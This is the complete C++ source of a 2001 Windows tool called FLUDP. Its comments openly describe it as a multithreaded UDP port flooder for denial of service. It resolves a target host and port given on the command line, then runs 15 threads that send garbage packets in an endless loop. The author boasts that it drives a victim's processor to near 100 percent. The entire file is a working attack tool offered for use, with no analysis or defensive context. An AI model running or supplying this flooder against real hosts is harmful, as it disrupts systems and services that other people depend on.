   // FLUDP v1.0 - Multithreaded Windows UDP Port Flooder DoS (Win32)
   // Coded by aLL3gRo <allegro16@hotmail.com>
   // Compiled on Borland C++ v5.02, 3 May 2001
   // Works on Win9x/ME/NT/2K
   // Capable of sending an average of 5500 packets per second & 3,000,000 bytes per second
   // I've tested it with the victim system running BlackIce Defender v2.5.36 and discovered that
   // it can lock the processor up at near 100 percent with the blackd.exe process taking all processor load.
   // As a result, the victim's system would be rather sluggish and lagging.

   #include <iostream.h>
   #include <stdlib.h>
   #include <winsock.h>

   int i, rs;

   //garbage data to send for flooding
   char data[501]={"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"};
   WSADATA wsadata;
   WORD wVer;
   struct sockaddr_in fludp;
   SOCKET flood;
   void floood();
   void DisplayUsage();
   void Clean();
   DWORD threadid;
   HANDLE ddd[16];
   int count=0;
   LPHOSTENT host;
   u_long dwNoBlock;


   void main(int argc, char *argv[])
   {
     register char stat[20];
     if(argc != 3) {
       DisplayUsage();
     }
     atexit(Clean);
     wVer=MAKEWORD(1,1);
     rs=WSAStartup(wVer,&wsadata);
     if(rs!=0) {
       cout << "Error: Unable to initialize Winsock DLL !" << endl;
       exit(-1);
     }
     flood=socket(AF_INET,SOCK_DGRAM,0);
     if(flood==INVALID_SOCKET) {
       cout << "Error: Unable to create socket !" << endl;
       exit(-1);
     }
     rs=inet_addr(argv[1]);
      if(rs==INADDR_NONE) {
        host = gethostbyname(argv[1]);
        if(host==NULL) {
          cout << "Error resolving hostname !" << endl;
          rs=closesocket(flood);
          WSACleanup();
          exit(-1);
         }
         fludp.sin_addr.s_addr = ((struct in_addr far *)(host->h_addr))->s_addr;
      }
      else {
        fludp.sin_addr.s_addr=inet_addr(argv[1]);
      }
      fludp.sin_family=AF_INET;
      fludp.sin_port=htons(atoi(argv[2]));
      dwNoBlock=TRUE;
      rs=ioctlsocket(flood,FIONBIO,&dwNoBlock);
      cout << "\nFLUDP v1.0 - Windows UDP Port Flooder" << endl;
      cout << "Coded by aLL3gRo <allegro16@hotmail.com>" << endl;
      cout << endl;
      strcpy(stat,"Flooding target host ");
      strcat(stat,argv[1]);
      strcat(stat,"....\n");
      cout << stat;

      //15 threads for faster performance
      for(i=1;i<=15;i++) {
        ddd[count]=CreateThread(0,0,(LPTHREAD_START_ROUTINE)floood,0,0,&threadid);
        count++;
      }
      WaitForMultipleObjects(15,ddd,TRUE,INFINITE);

   }

   //Main flooding thread
   void floood()
   {
     for(;;) {
       rs=sendto(flood,(char far *)data,sizeof(data),0,(struct sockaddr far *)&fludp,sizeof(fludp));
       if(rs==SOCKET_ERROR) {
         cout << "Error: Unable to send UDP packets !" << endl;
         break;
       }
     }
   }

   void DisplayUsage()
   {
     cout << "\nFLUDP v1.0 - Windows UDP Port Flooder (Win32)" << endl;
     cout << "Coded by aLL3gRo <allegro16@hotmail.com>" << endl;
     cout << "Usage: fludp <IP address or hostname> <target port>" << endl;
     exit(0);
   }

   void Clean()
   {
     WSACleanup();
   }
